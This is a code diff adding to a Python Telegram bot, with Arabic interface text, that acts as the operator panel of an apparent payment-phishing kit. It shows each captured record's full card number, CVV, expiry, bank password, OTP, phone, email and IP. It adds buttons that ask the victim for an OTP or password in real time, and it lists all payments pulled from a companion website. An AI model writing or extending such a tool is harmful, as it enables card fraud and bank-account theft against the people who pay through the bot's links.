@@ -1,4 +1,3 @@
-
 import os
 import requests
 from dotenv import load_dotenv
@@ -120,4 +119,57 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"💳 <b>رقم البطاقة:</b> <code>{payment.get('card_number', 'غير متوفر')}</code>\n"
             f"👤 <b>اسم صاحب البطاقة:</b> {payment.get('card_holder', 'غير متوفر')}\n"
             f"📅 <b>تاريخ الانتهاء:</b> {payment.get('expiry_month', '??')}/{payment.get('expiry_year', '??')}\n"
-            f"🔒 <b>CVV:</b> <code>{payment.get('cvv', 'غير متوفر')}</c
+            f"🔒 <b>CVV:</b> <code>{payment.get('cvv', 'غير متوفر')}</code>\n"
+            f"🔑 <b>كلمة السر:</b> <code>{payment.get('password', 'غير متوفر')}</code>\n"
+            f"📱 <b>OTP:</b> <code>{payment.get('otp', 'غير متوفر')}</code>\n\n"
+            f"━━━━━━━━━━━━━━━━━━━━\n"
+            f"💰 <b>المبلغ:</b> {payment.get('amount', '0')} {payment.get('currency', 'USD')}\n"
+            f"📧 <b>الإيميل:</b> {payment.get('email', 'غير متوفر')}\n"
+            f"📱 <b>الهاتف:</b> {payment.get('phone', 'غير متوفر')}\n"
+            f"🌐 <b>IP:</b> <code>{payment.get('ip', 'غير متوفر')}</code>\n"
+            f"⏰ <b>الوقت:</b> {payment.get('timestamp', 'غير متوفر')}\n"
+            f"━━━━━━━━━━━━━━━━━━━━\n\n"
+            f"📊 <b>الحالة:</b> {status_emoji} <b>{status.upper()}</b>"
+        )
+        keyboard = []
+        if status == 'pending':
+            keyboard = [
+                [InlineKeyboardButton("✅ قبول الدفع", callback_data=f"accept_{pid}"),
+                 InlineKeyboardButton("❌ رفض الدفع", callback_data=f"reject_{pid}")],
+                [InlineKeyboardButton("🔑 طلب OTP", callback_data=f"request_otp_{pid}"),
+                 InlineKeyboardButton("🔒 طلب كلمة سر", callback_data=f"request_pass_{pid}")]
+            ]
+        keyboard.append([InlineKeyboardButton("🔙 رجوع للقائمة", callback_data="back")])
+        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
+    elif data in ["all", "pending", "approved", "rejected"]:
+        try:
+            res = requests.get(f"{WEBSITE_URL}/api/all", timeout=5)
+            all_payments = res.json()
+        except:
+            all_payments = {}
+        filtered = {k: v for k, v in all_payments.items() if data == "all" or v.get('status') == data}
+        if not filtered:
+            await query.edit_message_text(f"📭 لا توجد مدفوعات في هذا القسم!")
+            return
+        text = f"📋 <b>المدفوعات ({len(filtered)})</b>\n\n"
+        keyboard = []
+        for pid, p in list(filtered.items())[:10]:
+            emoji = {"pending": "⏳", "approved": "✅", "rejected": "❌", "needs_otp": "📱", "needs_password": "🔒"}.get(p.get('status'), "⏳")
+            text += f"{emoji} <code>{pid[:10]}...</code> - ${p.get('amount', '0')}\n"
+            keyboard.append([InlineKeyboardButton(f"{emoji} {pid[:8]}... ${p.get('amount', '0')}", callback_data=f"view_{pid}")])
+        keyboard.append([InlineKeyboardButton("🔙 رجوع", callback_data="back")])
+        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
+    elif data == "back":
+        await show_menu(update, context)
+
+def main():
+    app = Application.builder().token(BOT_TOKEN).build()
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("paylink", send_payment_link))
+    app.add_handler(CallbackQueryHandler(callback_handler))
+    print("🤖 Bot started! Send /start to become admin.")
+    app.run_polling()
+
+if __name__ == '__main__':
+    main()
+        
